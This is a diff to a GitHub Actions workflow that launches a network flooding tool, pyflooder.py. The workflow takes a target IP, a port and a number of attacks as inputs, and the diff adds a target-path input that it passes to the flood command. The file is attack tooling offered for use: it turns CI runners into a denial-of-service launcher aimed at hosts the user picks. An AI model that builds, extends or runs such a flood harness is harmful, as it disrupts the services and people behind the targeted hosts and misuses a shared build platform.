@@ -14,6 +14,10 @@ on:
         description: "Number Of Attacks (Blank for Unlimited)"
         required: true
         default: ""
+      path:
+        description: "Path Target (Blank for random)"
+        required: true
+        default: ""
 
 jobs:
   build:
@@ -31,4 +35,4 @@ jobs:
         if [ -f requirements.txt ]; then pip install -r requirements.txt; fi
     - name: Starting Flood...
       run: |
-        python pyflooder.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.noa }}
+        python pyflooder.py ${{ github.event.inputs.iptgt }} ${{ github.event.inputs.portgt }} ${{ github.event.inputs.noa }} ${{ github.event.inputs.path }}
